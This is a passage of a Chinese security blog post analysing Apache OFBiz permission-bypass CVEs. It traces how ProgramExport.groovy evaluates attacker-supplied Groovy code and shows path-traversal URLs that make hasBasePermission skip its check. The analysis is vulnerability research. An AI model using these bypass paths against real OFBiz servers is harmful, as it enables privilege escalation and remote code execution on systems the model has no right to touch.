class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果登陆成功，则会渲染value对应的视图(可以看到view对应的value都是一些路由=&gt;你发现了什么，如果发现了可以先自己看看，没有则继续看我分析)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;main&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;requirePasswordChange&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;requirePasswordChange&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;login&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>这里为方便理解其后的漏洞场景，这里我们换一个路由，以ProgramExport为例，查看对应配置，可以看到无论response如何响应其视图都是ProgramExport</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;request-map uri=<span class="string">&quot;ProgramExport&quot;</span>&gt;</span><br><span class="line">    &lt;security https=<span class="string">&quot;true&quot;</span> auth=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">    &lt;response name=<span class="string">&quot;success&quot;</span> type=<span class="string">&quot;view&quot;</span> value=<span class="string">&quot;ProgramExport&quot;</span>/&gt;</span><br><span class="line">    &lt;response name=<span class="string">&quot;error&quot;</span> type=<span class="string">&quot;view&quot;</span> value=<span class="string">&quot;ProgramExport&quot;</span>/&gt;</span><br><span class="line">&lt;/request-map&gt;</span><br></pre></td></tr></table></figure><p>那么接下来我们来简单看看renderView是如何处理的，为方便理解这里我手动去除了大量漏洞主题无关代码，我们主要关注以下部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">renderView</span><span class="params">(String view, <span class="keyword">boolean</span> allowExtView, HttpServletRequest req, HttpServletResponse resp, String saveName)</span> <span class="keyword">throws</span> RequestHandlerException </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function">xxxxxxxxxxxxxxxxx</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="params">(viewMap.page == <span class="keyword">null</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!allowExtView) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RequestHandlerException(<span class="string">&quot;No view to render.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            nextPage = <span class="string">&quot;/&quot;</span> + oldView;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        nextPage = viewMap.page;</span><br><span class="line">    &#125;</span><br><span class="line">    ConfigXMLReader.ViewMap viewMap = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        viewMap = (view == <span class="keyword">null</span> ? <span class="keyword">null</span> : getControllerConfig().getViewMapMap().get(view));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (WebAppConfigurationException e) &#123;</span><br><span class="line">        Debug.logError(e, <span class="string">&quot;Exception thrown while parsing controller.xml file: &quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RequestHandlerException(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (viewMap == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RequestHandlerException(<span class="string">&quot;No definition found for view with name [&quot;</span> + view + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">xxxxxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;Rendering view [&quot;</span> + nextPage + <span class="string">&quot;] of type [&quot;</span> + viewMap.type + <span class="string">&quot;]&quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">        ViewHandler vh = viewFactory.getViewHandler(viewMap.type);</span><br><span class="line">        vh.render(view, nextPage, viewMap.info, contentType, charset, req, resp);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ViewHandlerException e) &#123;</span><br><span class="line">        Throwable throwable = e.getNested() != <span class="keyword">null</span> ? e.getNested() : e;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RequestHandlerException(e.getNonNestedMessage(), throwable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">xxxxxxxxxxxxxxxxx</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> ConfigXMLReader.<span class="function">ControllerConfig <span class="title">getControllerConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ConfigXMLReader.getControllerConfig(<span class="keyword">this</span>.controllerConfigURL);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (WebAppConfigurationException e) &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">FIXME:</span> controller.xml errors should throw an exception.</span></span><br><span class="line">        Debug.logError(e, <span class="string">&quot;Exception thrown while parsing controller.xml file: &quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">RequestHandler</span><span class="params">(ServletContext context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.controllerConfigURL = ConfigXMLReader.getControllerConfigURL(context);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ConfigXMLReader.getControllerConfig(<span class="keyword">this</span>.controllerConfigURL);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (WebAppConfigurationException e) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">xxxxxxxxx</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析的配置对应配置文件中的这部分,type为screen对应<code>MacroScreenViewHandler</code>(对应配置文件下handler标签下type为view的配置)，page对应nextPage也就是<code>component://webtools/widget/EntityScreens.xml#ProgramExport</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view-map</span> <span class="attr">name</span>=<span class="string">&quot;ProgramExport&quot;</span> <span class="attr">type</span>=<span class="string">&quot;screen&quot;</span> <span class="attr">page</span>=<span class="string">&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>接下来render的流程比较复杂，这里就不再一点一点分析了，简单来说就是根据nextPage解析对应字段参数，在这里即为<code>EntityScreens.xml</code>中的<code>screen</code>为<code>ProgramExport</code>的部分，对于其中的script字段也会去尝试解析执行<code>ProgramExport.groovy</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">screen</span> <span class="attr">name</span>=<span class="string">&quot;ProgramExport&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">actions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;titleProperty&quot;</span> <span class="attr">value</span>=<span class="string">&quot;PageTitleEntityExportAll&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;tabButtonItem&quot;</span> <span class="attr">value</span>=<span class="string">&quot;programExport&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">script</span> <span class="attr">location</span>=<span class="string">&quot;component://webtools/groovyScripts/entity/ProgramExport.groovy&quot;</span>/&gt;</span><span class="handlebars"><span class="xml"></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">        <span class="tag">&lt;/<span class="name">actions</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">        <span class="tag">&lt;<span class="name">widgets</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">            <span class="tag">&lt;<span class="name">decorator-screen</span> <span class="attr">name</span>=<span class="string">&quot;CommonImportExportDecorator&quot;</span> <span class="attr">location</span>=<span class="string">&quot;$&#123;parameters.mainDecoratorLocation&#125;&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">                <span class="tag">&lt;<span class="name">decorator-section</span> <span class="attr">name</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">                     <span class="tag">&lt;<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">                        <span class="tag">&lt;<span class="name">include-form</span> <span class="attr">name</span>=<span class="string">&quot;ProgramExport&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://webtools/widget/MiscForms.xml&quot;</span>/&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">                    <span class="tag">&lt;/<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">                    <span class="tag">&lt;<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">                        <span class="tag">&lt;<span class="name">platform-specific</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">                            <span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">html-template</span> <span class="attr">location</span>=<span class="string">&quot;component://webtools/template/entity/ProgramExport.ftl&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">                        <span class="tag">&lt;/<span class="name">platform-specific</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">                    <span class="tag">&lt;/<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">                <span class="tag">&lt;/<span class="name">decorator-section</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">            <span class="tag">&lt;/<span class="name">decorator-screen</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">        <span class="tag">&lt;/<span class="name">widgets</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="tag">&lt;/<span class="name">screen</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p>查看<code>ProgramExport.groovy</code>，可以见得字段<code>groovyProgram</code>可控，从而造成任意代码执行，当然这里面还有一些代码限制，在上一次漏洞分析时我们已经提过了，这里就不再重复分析了</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.ofbiz.entity.Delegator</span><br><span class="line"><span class="keyword">import</span> org.apache.ofbiz.entity.GenericValue</span><br><span class="line"><span class="keyword">import</span> org.apache.ofbiz.entity.model.ModelEntity</span><br><span class="line"><span class="keyword">import</span> org.apache.ofbiz.base.util.*</span><br><span class="line"><span class="keyword">import</span> org.apache.ofbiz.security.SecuredUpload</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.customizers.ImportCustomizer</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.CompilerConfiguration</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.MultipleCompilationErrorsException</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.control.ErrorCollector</span><br><span class="line"></span><br><span class="line">String groovyProgram = <span class="literal">null</span></span><br><span class="line">recordValues = []</span><br><span class="line">errMsgList = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!parameters.groovyProgram) &#123;</span><br><span class="line">    groovyProgram = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// Use the List variable recordValues to fill it with GenericValue maps.</span></span><br><span class="line"><span class="string">// full groovy syntaxt is available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">import org.apache.ofbiz.entity.util.EntityFindOptions</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// find the first three record in the product entity (if any)</span></span><br><span class="line"><span class="string">EntityFindOptions findOptions = new EntityFindOptions()</span></span><br><span class="line"><span class="string">findOptions.setMaxRows(3)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">List products = delegator.findList(&quot;Product&quot;, null, null, null, findOptions, false)</span></span><br><span class="line"><span class="string">if (products != null) &#123;</span></span><br><span class="line"><span class="string">    recordValues.addAll(products)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    parameters.groovyProgram = groovyProgram</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    groovyProgram = parameters.groovyProgram</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add imports for script.</span></span><br><span class="line"><span class="keyword">def</span> importCustomizer = <span class="keyword">new</span> ImportCustomizer()</span><br><span class="line">importCustomizer.addImport(<span class="string">&quot;org.apache.ofbiz.entity.GenericValue&quot;</span>)</span><br><span class="line">importCustomizer.addImport(<span class="string">&quot;org.apache.ofbiz.entity.model.ModelEntity&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> configuration = <span class="keyword">new</span> CompilerConfiguration()</span><br><span class="line">configuration.addCompilationCustomizers(importCustomizer)</span><br><span class="line"></span><br><span class="line">Binding binding = <span class="keyword">new</span> Binding()</span><br><span class="line">binding.setVariable(<span class="string">&quot;delegator&quot;</span>, delegator)</span><br><span class="line">binding.setVariable(<span class="string">&quot;recordValues&quot;</span>, recordValues)</span><br><span class="line"></span><br><span class="line">ClassLoader loader = Thread.currentThread().getContextClassLoader()</span><br><span class="line"><span class="keyword">def</span> shell = <span class="keyword">new</span> GroovyShell(loader, binding, configuration)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (UtilValidate.isNotEmpty(groovyProgram)) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Check if a webshell is not uploaded but allow &quot;import&quot;</span></span><br><span class="line">        <span class="keyword">if</span> (!SecuredUpload.isValidText(groovyProgram, [<span class="string">&quot;import&quot;</span>])) &#123;</span><br><span class="line">            logError(<span class="string">&quot;================== Not executed for security reason ==================&quot;</span>)</span><br><span class="line">            request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, <span class="string">&quot;Not executed for security reason&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        shell.parse(groovyProgram)</span><br><span class="line">        shell.evaluate(groovyProgram)</span><br><span class="line">        recordValues = shell.getVariable(<span class="string">&quot;recordValues&quot;</span>)</span><br><span class="line">        xmlDoc = GenericValue.makeXmlDocument(recordValues)</span><br><span class="line">        context.put(<span class="string">&quot;xmlDoc&quot;</span>, xmlDoc)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(MultipleCompilationErrorsException e) &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, e)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125; <span class="keyword">catch</span>(groovy.lang.MissingPropertyException e) &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, e)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, e)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125; <span class="keyword">catch</span>(NullPointerException e) &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, e)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">        request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, e)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，在我们简单了解了整个解析流程后，我们再来看看这三个连续出现的CVE就显得不那么困难了</p><h2 id="浅析连续出现三次的权限绕过漏洞"><a href="#浅析连续出现三次的权限绕过漏洞" class="headerlink" title="浅析连续出现三次的权限绕过漏洞"></a>浅析连续出现三次的权限绕过漏洞</h2><p>在一开始流程分析我们更需要注重对流程的分析，在漏洞分析过程我们则更需要注重具体的细节</p><p>之前网上发的Payload其实和这个CVE的漏洞没啥关系(/webtools/control/forgotPassowrd/../ProgramExport压根就不会走到这个权限校验的逻辑)，这三个CVE本质是checkLogin事件中绕过<code>org.apache.ofbiz.webapp.control.LoginWorker#hasBasePermission</code>实现低权限用户的权限提升</p><p>分析前我先创建一个最小权限的账号(甚至没有正常登录后台的权限)(PS:此截图来源于V18.12.12)，这个漏洞的作用就能帮助我们完成垂直越权</p><p><img src="/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/image-20240623232919733.png" alt="image-20240623232919733"></p><h3 id="CVE-2024-25065"><a href="#CVE-2024-25065" class="headerlink" title="CVE-2024-25065"></a>CVE-2024-25065</h3><h4 id="权限绕过浅析"><a href="#权限绕过浅析" class="headerlink" title="权限绕过浅析"></a>权限绕过浅析</h4><p>对账号的访问权限部分由<code>org.apache.ofbiz.webapp.control.LoginWorker#hasBasePermission</code>控制</p><p>在这里很显然只要我们能够让info为null即可跳过判断，查看<code>ComponentConfig.getWebAppInfo</code>的代码我们不难发现，判断条件是<code>equals</code>，因此只要我们能让其不相等即可，而这个<code>contextPath</code>变量来源于<code>request.getContextPath()</code>的执行结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.ofbiz.webapp.control.LoginWorker</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">hasBasePermission</span><span class="params">(GenericValue userLogin, HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">    Security security = (Security) request.getAttribute(<span class="string">&quot;security&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ServletContext context = request.getServletContext();</span><br><span class="line">        String serverId = (String) context.getAttribute(<span class="string">&quot;_serverId&quot;</span>);</span><br><span class="line">        <span class="comment">// get a context path from the request, if it is empty then assume it is the root mount point</span></span><br><span class="line">        String contextPath = request.getContextPath();</span><br><span class="line">        <span class="keyword">if</span> (UtilValidate.isEmpty(contextPath)) &#123;</span><br><span class="line">            contextPath = <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ComponentConfig.WebappInfo info = ComponentConfig.getWebAppInfo(serverId, contextPath);</span><br><span class="line">        <span class="keyword">if</span> (info != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> hasApplicationPermission(info, security, userLogin);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (Debug.infoOn()) &#123;</span><br><span class="line">                Debug.logInfo(<span class="string">&quot;No webapp configuration found for : &quot;</span> + serverId + <span class="string">&quot; / &quot;</span> + contextPath, <span class="keyword">module</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Debug.warningOn()) &#123;</span><br><span class="line">            Debug.logWarning(<span class="string">&quot;Received a null Security object from HttpServletRequest&quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.ofbiz.base.component.ComponentConfig</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> WebappInfo <span class="title">getWebAppInfo</span><span class="params">(String serverName, String contextRoot)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (serverName == <span class="keyword">null</span> || contextRoot == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ComponentConfig.WebappInfo info = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (ComponentConfig cc : getAllComponents()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (WebappInfo wInfo : cc.getWebappInfos()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (serverName.equals(wInfo.server) &amp;&amp; contextRoot.equals(wInfo.getContextRoot())) &#123;</span><br><span class="line">                info = wInfo;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里为了方便大家的理解，我们可以看一下具体的函数实现</p><p>在<code>org.apache.catalina.connector.Request#getContextPath</code>中，可以看到函数的返回与<code>match</code>相关</p><p>我们只需保证<code>candidate</code>与<code>canonicalContextPath</code>相等即可让match返回true(<code>match = canonicalContextPath.equals(candidate);</code>)，而<code>candidate</code>的值是通过while循环取得，每次多取一级子目录的值，并经过url解码以及normalize后即为其值</p><p>因此我们很容易构造出这样的URL<code>/y4tacker/../webtools/control/login</code>，这样<code>ContextPath</code>的值中就会带上<code>/y4tacker/../</code>，显然不会再与配置中的值相等，从而实现绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return the portion of the request URI used to select the Context of the Request. The value returned is not</span></span><br><span class="line"><span class="comment"> * decoded which also implies it is not normalised.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getContextPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lastSlash = mappingData.contextSlashCount;</span><br><span class="line">    <span class="comment">// Special case handling for the root context</span></span><br><span class="line">    <span class="keyword">if</span> (lastSlash == <span class="number">0</span>) 